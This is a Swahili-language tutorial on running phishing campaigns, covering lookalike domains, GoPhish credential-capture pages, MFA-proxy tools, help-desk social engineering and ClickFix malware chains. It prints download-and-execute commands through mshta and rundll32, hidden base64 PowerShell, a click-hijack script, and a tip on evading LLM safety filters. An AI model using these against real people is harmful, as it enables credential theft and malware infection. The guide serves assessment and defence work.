# Methodology ya Phishing

## Methodology

1. Fanya Recon ya victim
1. Chagua **victim domain**.
2. Fanya web enumeration ya msingi **ukitafuta login portals** zinazotumiwa na victim na **amua** ni ipi utakayo **impersonate**.
3. Tumia **OSINT** **kutafuta emails**.
2. Andaa mazingira
1. **Nunua domain** utakayotumia kwa phishing assessment
2. **Sanidi records za email service** zinazohusiana (SPF, DMARC, DKIM, rDNS)
3. Sanidi VPS yenye **gophish**
3. Andaa campaign
1. Andaa **email template**
2. Andaa **web page** ya kuiba credentials
4. Zindua campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Jina la domain **lina** **keyword** muhimu ya domain ya awali (mfano, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Badilisha **dot kuwa hyphen** ya subdomain (mfano, www-zelster.com).
- **New TLD**: Domain ileile ikitumia **TLD mpya** (mfano, zelster.org)
- **Homoglyph**: **Inabadilisha** herufi moja katika jina la domain na **herufi zinazofanana kwa mwonekano** (mfano, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Inabadilisha nafasi za herufi mbili** ndani ya jina la domain (mfano, zelsetr.com).
- **Singularization/Pluralization**: Huongeza au kuondoa “s” mwishoni mwa jina la domain (mfano, zeltsers.com).
- **Omission**: **Huondoa herufi moja** katika jina la domain (mfano, zelser.com).
- **Repetition:** **Hunarudia herufi moja** katika jina la domain (mfano, zeltsser.com).
- **Replacement**: Kama homoglyph lakini ikiwa si stealthy sana. Hubadilisha herufi moja katika jina la domain, labda kwa herufi iliyo karibu na herufi ya awali kwenye keyboard (mfano, zektser.com).
- **Subdomained**: Huanzisha **dot** ndani ya jina la domain (mfano, ze.lster.com).
- **Insertion**: **Huongeza herufi** katika jina la domain (mfano, zerltser.com).
- **Missing dot**: Huambatanisha TLD kwenye jina la domain (mfano, zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Kuna **uwezekano kwamba baadhi ya bits zilizohifadhiwa au zinazowasilishwa zinaweza kubadilishwa moja kwa moja** kutokana na sababu mbalimbali kama vile solar flares, cosmic rays au hitilafu za hardware.

Dhana hii **inapotumika kwenye DNS requests**, inawezekana kwamba **domain iliyopokelewa na DNS server** si sawa na domain iliyoombwa mwanzoni.

Kwa mfano, mabadiliko ya bit moja katika domain "windows.com" yanaweza kuibadilisha kuwa "windnws.com."

Attackers wanaweza **kuchukua faida ya hili kwa kusajili domains nyingi za bit-flipping** zinazofanana na domain ya victim. Lengo lao ni kuwaelekeza watumiaji halali kwenye infrastructure yao wenyewe.

Kwa maelezo zaidi soma [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Buy a trusted domain

Unaweza kutafuta domain iliyo-expire kwenye [https://www.expireddomains.net/](https://www.expireddomains.net) ambayo unaweza kuitumia.\
Ili kuhakikisha kwamba domain iliyo-expire utakayonunua **tayari ina SEO nzuri**, unaweza kutafuta imeainishwaje katika:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Ili **kugundua** email addresses halali zaidi au **kuthibitisha zile** ambazo tayari umegundua, unaweza kuangalia kama unaweza kuzifanyia brute-force kwenye smtp servers za victim. [Jifunze jinsi ya kuthibitisha/kugundua email address hapa](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Zaidi ya hayo, usisahau kwamba ikiwa users wanatumia **web portal yoyote kufikia mails zao**, unaweza kuangalia ikiwa inaathiriwa na **username brute force**, na kutumia vulnerability hiyo ikiwezekana.

## Configuring GoPhish

### Installation

Unaweza kuipakua kutoka [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pakua na decompress ndani ya `/opt/gophish` kisha execute `/opt/gophish/gophish`\
Utapewa password ya admin user kwenye port 3333 katika output. Kwa hiyo, fikia port hiyo na utumie credentials hizo kubadilisha admin password. Huenda ukahitaji kutunnel port hiyo kwenda local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Usanidi

**Usanidi wa cheti cha TLS**

Kabla ya hatua hii, unapaswa kuwa **umenunua domain** utakayotumia, na lazima iwe **inaelekeza** kwenye **IP ya VPS** ambako una-configure **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Usanidi wa barua pepe**

Anza kusakinisha: `apt-get install postfix`

Kisha ongeza domain kwenye mafaili yafuatayo:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Badilisha pia thamani za variables zifuatazo ndani ya /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Hatimaye, badilisha mafaili **`/etc/hostname`** na **`/etc/mailname`** yawe na jina la domain yako, kisha **restart VPS yako.**

Sasa, tengeneza **DNS A record** ya `mail.<domain>` inayoelekeza kwenye **ip address** ya VPS, na **DNS MX** record inayoelekeza kwenye `mail.<domain>`

Sasa hebu tujaribu kutuma email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Usanidi wa Gophish**

Simamisha utekelezaji wa gophish na tuisanidi.\
Rekebisha `/opt/gophish/config.json` kuwa ifuatayo (zingatia matumizi ya https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Sanidi service ya gophish**

Ili kuunda service ya gophish ili iweze kuanzishwa kiotomatiki na kusimamiwa kama service, unaweza kuunda faili `/etc/init.d/gophish` lenye maudhui yafuatayo:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Maliza kusanidi huduma na kuikagua kwa kufanya:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Kus配置 seva ya barua pepe na domain

### Subiri na uwe halali

Kadiri domain ilivyozeeka, ndivyo uwezekano wa kutambuliwa kama spam unavyopungua. Kwa hiyo, unapaswa kusubiri muda mrefu iwezekanavyo (angalau wiki 1) kabla ya kufanya tathmini ya phishing. Zaidi ya hayo, ukiweka ukurasa kuhusu sekta yenye sifa nzuri, sifa utakayopata itakuwa bora zaidi.

Kumbuka kwamba hata ikiwa ni lazima usubiri wiki moja, unaweza kumaliza kusanidi kila kitu sasa.

### Sanidi rekodi ya Reverse DNS (rDNS)

Weka rekodi ya rDNS (PTR) inayotatua anwani ya IP ya VPS kuwa jina la domain.

### Rekodi ya Sender Policy Framework (SPF)

Lazima **usanidi rekodi ya SPF kwa domain mpya**. Ikiwa hujui rekodi ya SPF ni nini, [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Unaweza kutumia [https://www.spfwizard.net/](https://www.spfwizard.net) kutengeneza sera yako ya SPF (tumia IP ya mashine ya VPS)

![Fomu ya SPF Wizard ya kutengeneza rekodi ya SPF kwa domain ya phishing](<../../images/image (1037).png>)

Haya ndiyo maudhui yanayopaswa kuwekwa ndani ya rekodi ya TXT katika domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Rekodi ya Domain-based Message Authentication, Reporting & Conformance (DMARC)

Lazima **usanidi rekodi ya DMARC kwa domain mpya**. Ikiwa hujui rekodi ya DMARC ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Lazima uunde rekodi mpya ya DNS TXT inayoelekeza hostname `_dmarc.<domain>` yenye content ifuatayo:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Lazima **usanidi DKIM kwa domain mpya**. Ikiwa hujui DMARC record ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Mafunzo haya yanatokana na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Unahitaji kuunganisha thamani zote mbili za B64 zinazozalishwa na ufunguo wa DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Jaribu alama ya usanidi wa email yako

Unaweza kufanya hivyo kwa kutumia [https://www.mail-tester.com/](https://www.mail-tester.com)\
Fungua tu ukurasa huo na utume email kwenye anwani watakayokupa:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Unaweza pia **kukagua usanidi wa barua pepe** kwa kutuma barua pepe kwa `check-auth@verifier.port25.com` na **kusoma jibu** (kwa hili utahitaji **kufungua** port **25** na kuona jibu kwenye faili _/var/mail/root_ ikiwa utatuma barua pepe kama root).\
Hakikisha unapita majaribio yote:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Unaweza pia kutuma **ujumbe kwa Gmail iliyo chini ya udhibiti wako**, na uangalie **vichwa vya barua pepe** katika kikasha chako cha Gmail, `dkim=pass` inapaswa kuwepo katika sehemu ya kichwa ya `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Kuondoa kwenye Spamhouse Blacklist

Ukurasa wa [www.mail-tester.com](https://www.mail-tester.com) unaweza kukuonyesha ikiwa domain yako inazuiwa na spamhouse. Unaweza kuomba domain/IP yako iondolewe kwenye: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Kuondoa kwenye Microsoft Blacklist

​​Unaweza kuomba domain/IP yako iondolewe kwenye [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Weka **jina la kutambua** sending profile
- Amua ni akaunti gani utatumia kutuma phishing emails. Mapendekezo: _noreply, support, servicedesk, salesforce..._
- Unaweza kuacha username na password wazi, lakini hakikisha umechagua Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: Unaweza kuacha username na password wazi, lakini hakikisha umechagua Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Inapendekezwa kutumia utendaji wa "**Send Test Email**" ili kujaribu ikiwa kila kitu kinafanya kazi.\
> Ningependekeza **utumie barua pepe za majaribio kwa anwani za 10min mail** ili kuepuka kuorodheshwa kwenye blacklist wakati wa kufanya majaribio.

### Email Template

- Weka **jina la kutambua** template
- Kisha andika **subject** (usiweke kitu cha kushangaza, andika tu kitu ambacho ungetarajia kusoma kwenye barua pepe ya kawaida)
- Hakikisha umechagua "**Add Tracking Image**"
- Andika **email template** (unaweza kutumia variables kama kwenye mfano ufuatao):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Kumbuka kwamba **ili kuongeza uaminifu wa email**, inapendekezwa kutumia sahihi kutoka kwenye email ya client. Mapendekezo:

- Tuma email kwa **anwani ambayo haipo** na uangalie kama jibu lina sahihi yoyote.
- Tafuta **email za umma** kama info@ex.com au press@ex.com au public@ex.com, zitumie email na usubiri jibu.
- Jaribu kuwasiliana na **email halali iliyogunduliwa** na usubiri jibu.

![Sending Profile - Email Template: Jaribu kuwasiliana na email halali iliyogunduliwa na usubiri jibu](<../../images/image (80).png>)

> [!TIP]
> Email Template pia inaruhusu **kuambatisha mafaili ya kutuma**. Ikiwa ungependa pia kuiba NTLM challenges kwa kutumia mafaili/documents yaliyoundwa mahsusi [soma ukurasa huu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Weka **jina**
- **Andika HTML code** ya ukurasa wa web. Kumbuka kwamba unaweza **kuimport** kurasa za web.
- Weka alama kwenye **Capture Submitted Data** na **Capture Passwords**
- Weka **redirection**

![Email Template - Landing Page: Weka alama kwenye Capture Submitted Data na Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Kwa kawaida utahitaji kurekebisha HTML code ya ukurasa na kufanya majaribio locally (labda ukitumia Apache server) **hadi uridhike na matokeo.** Kisha, andika HTML code hiyo kwenye kisanduku.\
> Kumbuka kwamba ikiwa unahitaji **kutumia static resources** za HTML (labda baadhi ya kurasa za CSS na JS) unaweza kuzihifadhi kwenye _**/opt/gophish/static/endpoint**_ na kisha uzifikie kutoka _**/static/\<filename>**_

> [!TIP]
> Kwa redirection unaweza **kuwaelekeza users kwenye ukurasa mkuu halali wa web wa victim**, au kuwaelekeza kwenye _/static/migration.html_ kwa mfano, kuweka **spinning wheel (**[**https://loading.io/**](https://loading.io)**) kwa sekunde 5 kisha kuonyesha kwamba mchakato umefanikiwa**.

### Users & Groups

- Weka jina
- **Import data** (kumbuka kwamba ili kutumia template ya mfano unahitaji firstname, last name na email address ya kila user)

![Landing Page - Users & Groups: Import data (kumbuka kwamba ili kutumia template ya mfano unahitaji firstname, last name na email address ya kila user)](<../../images/image (163).png>)

### Campaign

Mwisho, tengeneza campaign kwa kuchagua jina, email template, landing page, URL, sending profile na group. Kumbuka kwamba URL itakuwa link itakayotumwa kwa victims.

Kumbuka kwamba **Sending Profile inaruhusu kutuma test email ili kuona email ya mwisho ya phishing itakavyoonekana**:

![Users & Groups - Campaign: Kumbuka kwamba Sending Profile inaruhusu kutuma test email ili kuona email ya mwisho ya phishing itakavyoonekana](<../../images/image (192).png>)

Kila kitu kikiwa tayari, zindua campaign!

## Website Cloning

Ikiwa kwa sababu yoyote unataka kuclone website, angalia ukurasa ufuatao:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Katika baadhi ya phishing assessments (hasa kwa Red Teams) utataka pia **kutuma mafaili yenye aina fulani ya backdoor** (labda C2 au kitu kitakachotrigger authentication).\
Angalia ukurasa ufuatao kwa baadhi ya mifano:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Attack ya awali ni ya ujanja kwa sababu unafake website halisi na kukusanya taarifa zilizowekwa na user. Kwa bahati mbaya, ikiwa user hakuweka password sahihi au ikiwa application uliyofake imewekwa na 2FA, **taarifa hizi hazitakuruhusu kumuimpersonate user aliyedanganywa**.

Hapa ndipo tools kama [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) na [**muraena**](https://github.com/muraenateam/muraena) zinapokuwa muhimu. Tool hii itakuruhusu kutengeneza attack inayofanana na MitM. Kimsingi, attack hufanya kazi kwa njia ifuatayo:

1. **Unaimpersonate login** form ya webpage halisi.
2. User **anatuma** **credentials** zake kwenye fake page yako, na tool inazituma kwenye webpage halisi, **ikiangalia kama credentials zinafanya kazi**.
3. Ikiwa account imewekwa na **2FA**, MitM page itaomba 2FA hiyo, na baada ya **user kuiingiza**, tool itaituma kwenye webpage halisi.
4. Baada ya user ku-authenticate, wewe (kama attacker) utakuwa **umenasa credentials, 2FA, cookie na taarifa yoyote** kutoka kwenye kila interaction yako wakati tool inafanya MitM.

### Via VNC

Je, ikiwa badala ya **kumtuma victim kwenye malicious page** yenye muonekano sawa na ya awali, ungemtuma kwenye **VNC session yenye browser iliyounganishwa kwenye webpage halisi**? Utaweza kuona anachofanya, kuiba password, MFA iliyotumika, cookies...\
Unaweza kufanya hivi kwa [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Ni wazi kwamba mojawapo ya njia bora za kujua kama umebusted ni **kutafuta domain yako kwenye blacklists**. Ikiwa inaonekana ikiwa listed, kwa namna fulani domain yako imegunduliwa kuwa suspicious.\
Njia moja rahisi ya kuangalia kama domain yako inaonekana kwenye blacklist yoyote ni kutumia [https://malwareworld.com/](https://malwareworld.com)

Hata hivyo, kuna njia nyingine za kujua kama victim **anatafuta kwa bidii suspicious phishing activity iliyo kwenye internet**, kama ilivyoelezwa kwenye:


{{#ref}}
detecting-phising.md
{{#endref}}

Unaweza **kununua domain yenye jina linalofanana sana** na domain ya victim **na/au kutengeneza certificate** ya **subdomain** ya domain unayo-control **iliyo na** **keyword** ya domain ya victim. Ikiwa **victim** atafanya aina yoyote ya **DNS au HTTP interaction** nazo, utajua kwamba **anatafuta kwa bidii** suspicious domains na utahitaji kuwa stealth sana.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Tumia [**Phishious** ](https://github.com/Rices/Phishious)kutathmini kama email yako itaishia kwenye spam folder au itablockiwa au itafanikiwa.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Intrusion sets za kisasa zinazidi kuacha email lures kabisa na **kulenga moja kwa moja service-desk / identity-recovery workflow** ili kushinda MFA. Attack hii ni ya "living-off-the-land" kabisa: operator akishamiliki credentials halali, anapivot kwa kutumia admin tooling iliyojengwa ndani – malware haihitajiki.<sup>[[6]](#references)</sup>

### Attack flow
1. Fanya recon ya victim
* Kusanya personal & corporate details kutoka LinkedIn, data breaches, public GitHub, n.k.
* Tambua identities zenye thamani kubwa (executives, IT, finance) na orodhesha **help-desk process kamili** ya password / MFA reset.
2. Real-time social engineering
* Piga simu, tumia Teams au chat kuwasiliana na help-desk huku ukijifanya kuwa target (mara nyingi kwa **spoofed caller-ID** au **cloned voice**).
* Toa PII iliyokusanywa awali ili kupita knowledge-based verification.
* Mshawishi agent **areset MFA secret** au afanye **SIM-swap** kwenye mobile number iliyosajiliwa.
3. Immediate post-access actions (≤60 min in real cases)
* Weka foothold kupitia web SSO portal yoyote.
* Orodhesha AD / AzureAD kwa kutumia built-ins (hakuna binaries zinazodondoshwa):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Fanya lateral movement kwa kutumia **WMI**, **PsExec**, au **RMM** agents halali ambazo tayari zimewhitelistiwa kwenye environment.

### Detection & Mitigation
* Chukulia identity recovery ya help-desk kama **privileged operation** – hitaji step-up auth na idhini ya manager.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules zinazotoa alert kuhusu:
* MFA method imebadilishwa + authentication kutoka device / geo mpya.
* Immediate elevation ya principal hiyo hiyo (user-→-admin).
* Rekodi help-desk calls na ulazimishe **call-back kwa number iliyosajiliwa tayari** kabla ya reset yoyote.
* Implement **Just-In-Time (JIT) / Privileged Access** ili accounts zilizoresetiwa hivi karibuni zisirithi kiotomatiki high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews hupunguza gharama ya high-touch ops kwa mass attacks zinazogeuza **search engines & ad networks kuwa delivery channel**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** husukuma fake result kama `chromium-update[.]site` hadi juu kwenye search ads.
2. Victim anadownload **first-stage loader** ndogo (mara nyingi JS/HTA/ISO). Mifano iliyoonekana na Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader hufanya exfiltration ya browser cookies + credential DBs, kisha inavuta **silent loader** inayoamua – *in realtime* – kama itadeploy:
* RAT (k.m. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Block newly-registered domains na enforce **Advanced DNS / URL Filtering** kwenye *search-ads* pamoja na email.
* Restrict software installation kwa signed MSI / Store packages, deny execution ya `HTA`, `ISO`, `VBS` kwa policy.
* Monitor child processes za browsers zinazofungua installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt kwa LOLBins zinazotumiwa vibaya mara kwa mara na first-stage loaders (k.m. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Baadhi ya fake software portals huacha download `href` inayoonekana ikielekeza kwenye **real** GitHub/release URL, lakini hijack **interaction ya kwanza** ya user katika JavaScript na badala yake kumtuma victim kwenye chain ya **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Sifa kuu:
- Hook kwa kawaida huendeshwa katika **capture phase** (`true`) kwenye `document`, hivyo huwashwa kabla ya handlers za tovuti.
- Chrome mara nyingi hutumia `mousedown` badala ya `click` ili kuweka redirect ikiwa imefungamanishwa na **user gesture** halali na kuboresha upitaji wa popup blocker.
- Baadhi ya variants hufungua mapema `about:blank` au kuunda clicks za `<a target="_blank">`, kisha huweka TDS URL baadaye.
- Vikomo vya upande wa browser mara nyingi huhifadhiwa kwenye `localStorage`, hivyo **click ya kwanza** inaweza kumfikisha mwathiriwa kwenye malware, huku refresh/retry zikirejea kwenye link inayoonekana kuwa salama.
- TDS inaweza kuchuja kwa kutumia referrer, entry domain, GEO, browser/device fingerprint, ukaguzi wa VPN/datacenter, muktadha wa click, na counters za kila session, hivyo marudio ya analyst yanaweza kutoa matokeo yasiyotabirika.

Mawazo kwa Defender:
- Linganisha `href` **inayoonyeshwa** na target halisi ya navigation inayozalishwa wakati wa click.
- Tafuta handlers za `document.addEventListener(..., true)` zinazokiita vyote `preventDefault()` na `stopImmediatePropagation()` karibu na `window.open`, `about:blank`, au clicks za anchor zinazoundwa.
- Chukulia makundi ya domains mpya zilizosajiliwa za kupakua software, ambazo zote hupakia stage ileile ya CloudFront/JS, kama pattern yenye ishara kubwa ya SEO-poisoning/TDS.

### ClickFix kutoka kwenye fake verification pages + archive-looking LOLBAS fetches
Baadhi ya TDS branches huishia kwenye fake verification page (ya mtindo wa Cloudflare/IUAM) inayomwambia mwathiriwa aendeshe Windows binary inayoaminika kama:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Vidokezo:
- `mshta.exe` hutekeleza **HTA/VBScript mwanzoni mwa response**, hata kama URL inajifanya kuwa archive ya `.7z`; data ya archive iliyoongezwa inaweza kuwa decoy tupu.
- Hatua zinazofuata mara nyingi huendelea kudanganya kuhusu aina ya faili (`.rtf` kwa PowerShell, `.asar` kwa Python, ZIP zenye binaries zilizowekewa padding), kisha hubadilisha kwenda **manual PE mapping / in-memory execution**.
- Ikiwa unajibu mojawapo ya chains hizi, hifadhi **network + memory kutoka kwenye run ya kwanza iliyofanikiwa**: replay za baadaye zinaweza kuonyesha tu njia isiyo na madhara ya installer/SFX au kushindwa kwa sababu payload/key release ilifungwa kwenye TDS session ya awali.

### Mbinu za ClickFix DLL delivery (fake CERT update)
* Lure: advisory iliyoklonwa ya national CERT yenye kitufe cha **Update** kinachoonyesha maelekezo ya hatua kwa hatua ya “fix”. Victims huambiwa waendeshe batch inayopakua DLL na kui-execute kupitia `rundll32`.<sup>[[12]](#references)</sup>
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` huweka payload kwenye `%TEMP%`, sleep fupi huficha network jitter, kisha `rundll32` huita exported entrypoint (`notepad`).
* DLL hutuma host identity na kupoll C2 kila baada ya dakika chache. Remote tasking huwasili kama **base64-encoded PowerShell**, iki-execute kwa siri na policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Hii hudumisha flexibility ya C2 (server inaweza kubadilisha tasks bila kusasisha DLL) na huficha console windows. Tafuta PowerShell children wa `rundll32.exe` wanaotumia `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` kwa pamoja.
* Defenders wanaweza kutafuta HTTP(S) callbacks zenye muundo `...page.php?tynor=<COMPUTER>sss<USER>` na polling intervals za dakika 5 baada ya DLL load.

---

## Phishing Operations zilizoimarishwa na AI
Attackers sasa wanaunganisha **LLM & voice-clone APIs** kwa lures zilizobinafsishwa kikamilifu na interaction ya wakati halisi.

| Layer | Mfano wa matumizi na threat actor |
|-------|-----------------------------------|
|Automation|Generate & tuma >100 k emails / SMS zenye wording iliyowekwa random na tracking links.|
|Generative AI|Tengeneza *one-off* emails zinazorejelea public M&A, inside jokes kutoka social media; deep-fake CEO voice kwenye callback scam.|
|Agentic AI|Jisajili domains, scrape open-source intel, na craft next-stage mails kwa uhuru victim anapobofya lakini hakutumi creds.|

**Defence:**
• Ongeza **dynamic banners** zinazoangazia messages zilizotumwa kutoka untrusted automation (kupitia ARC/DKIM anomalies).
• Deploy **voice-biometric challenge phrases** kwa phone requests zenye risk kubwa.
• Endelea ku-simulate AI-generated lures katika awareness programmes – static templates zimepitwa na wakati.

Tazama pia – matumizi mabaya ya agentic browsing kwa credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Tazama pia – matumizi mabaya ya AI agent ya local CLI tools na MCP (kwa secrets inventory na detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly ya phishing JavaScript (in-browser codegen)

Attackers wanaweza kusambaza HTML inayoonekana kuwa salama na **kugenerate stealer wakati wa runtime** kwa kuiomba **trusted LLM API** JavaScript, kisha kui-execute ndani ya browser (kwa mfano, `eval` au dynamic `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings kwenye prompt; iterate wording ili kupita safety filters na kupunguza hallucinations.
